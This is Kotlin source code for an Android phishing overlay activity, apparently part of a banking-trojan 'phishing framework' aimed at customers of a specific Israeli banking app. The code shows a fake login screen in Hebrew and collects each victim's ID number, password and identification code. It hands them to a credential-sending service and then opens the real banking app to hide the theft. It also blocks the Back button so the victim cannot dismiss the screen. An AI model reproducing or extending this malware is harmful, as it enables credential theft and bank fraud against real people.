package com.example.phishingframework.activities

import android.app.Activity
import android.content.BroadcastReceiver
import android.content.Context
import android.content.Intent
import android.content.IntentFilter
import android.graphics.Color
import android.graphics.drawable.ColorDrawable
import android.os.Bundle
import android.text.Editable
import android.text.TextWatcher
import android.util.Log
import android.widget.Button
import android.widget.EditText
import android.widget.TextView
import android.widget.Toast
import androidx.core.content.ContextCompat
import com.example.phishingframework.R
import com.example.phishingframework.services.CredentialSendService
import com.example.phishingframework.utils.Constants
import com.example.phishingframework.utils.ValidationUtils
import java.util.*

//Login screen imitation - displays an interface identical to the real bank application
//Credential theft - collects ID number, password and identification code
//Transfer to real application - after stealing the data, opens the real application
class PhishingOverlayActivity : Activity() {

    // Regex patterns
    private val ID_REGEX = Regex("\\d{9}")
    private val CODE_REGEX = Regex("[A-Z]{2}\\d{4}")

    private lateinit var resultReceiver: BroadcastReceiver

    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)
        window.setBackgroundDrawable(ColorDrawable(Color.TRANSPARENT))

        setContentView(R.layout.phishing_login_overlay)

        // Set greeting according to time
        setDynamicGreeting()

        val idField = findViewById<EditText>(R.id.id_field)
        val passwordField = findViewById<EditText>(R.id.password_field)
        val codeField = findViewById<EditText>(R.id.code_field)
        val loginButton = findViewById<Button>(R.id.login_button)

        // Check if there's an error message from the previous attempt
        val errorMessage = intent.getStringExtra("error_message")
        if (errorMessage != null) {
            passwordField.error = errorMessage
            passwordField.setText("")
        }

        val watcher = object : TextWatcher {
            override fun afterTextChanged(s: Editable?) {
                if (idField.error != null && ID_REGEX.matches(idField.text))
                    idField.error = null
                if (passwordField.error != null && passwordField.text.length >= 6)
                    passwordField.error = null
                if (codeField.error != null && CODE_REGEX.matches(codeField.text))
                    codeField.error = null
            }
            override fun beforeTextChanged(s: CharSequence?, start: Int, count: Int, after: Int) {}
            override fun onTextChanged(s: CharSequence?, start: Int, before: Int, count: Int) {}
        }

        idField.addTextChangedListener(watcher)
        passwordField.addTextChangedListener(watcher)
        codeField.addTextChangedListener(watcher)

        // Register receiver for results
        resultReceiver = object : BroadcastReceiver() {
            override fun onReceive(context: Context, intent: Intent) {
                when (intent.action) {
                    Constants.ACTION_CREDENTIALS_OK -> {
                        Log.i("PhishingOverlay", "Credentials sent successfully")
                        val launchIntent = packageManager.getLaunchIntentForPackage("com.ideomobile.mercantile")
                        if (launchIntent != null) {
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_NEW_TASK)
                            launchIntent.addFlags(Intent.FLAG_ACTIVITY_CLEAR_TASK)
                            startActivity(launchIntent)
                        }
                        finish()
                    }
                    Constants.ACTION_CREDENTIALS_FAILED -> {
                        Toast.makeText(
                            this@PhishingOverlayActivity,
                            "שליחת הפרטים נכשלה. אנא נסה שוב.",
                            Toast.LENGTH_LONG
                        ).show()
                    }
                }
            }
        }
        val filter = IntentFilter().apply {
            addAction(Constants.ACTION_CREDENTIALS_OK)
            addAction(Constants.ACTION_CREDENTIALS_FAILED)
        }
        ContextCompat.registerReceiver(
            this,
            resultReceiver,
            filter,
            ContextCompat.RECEIVER_NOT_EXPORTED
        )
        loginButton.setOnClickListener {
            if (!ValidationUtils.validateAndMarkErrors(idField, passwordField, codeField)) {
                return@setOnClickListener
            }
            val idNumber = idField.text.toString()
            val password = passwordField.text.toString()
            val code = codeField.text.toString()

            Log.d("PhishingOverlay", "Sending credentials: id=$idNumber")

            // Send data to service
            val intent = Intent(this, CredentialSendService::class.java).apply {
                putExtra("id", idNumber)
                putExtra("password", password)
                putExtra("code", code)
            }
            startService(intent)
        }
        idField.requestFocus()
    }

    private fun setDynamicGreeting() {
        val greetingText = findViewById<TextView>(R.id.greeting_text)
        val calendar = Calendar.getInstance()
        val hour = calendar.get(Calendar.HOUR_OF_DAY)

        val greeting = when (hour) {
            in 5..11 -> "בוקר טוב"
            in 12..17 -> "צהריים טובים"
            in 18..23, in 0..4 -> "ערב טוב"
            else -> "ערב טוב"
        }

        greetingText.text = greeting
    }

    override fun onBackPressed() {
        // Prevent closing with Back button press
        // User must enter details
    }

    override fun onDestroy() {
        super.onDestroy()
        try {
            unregisterReceiver(resultReceiver)
        } catch (e: Exception) {
            Log.e("PhishingOverlay", "Error unregistering receiver", e)
        }
    }
}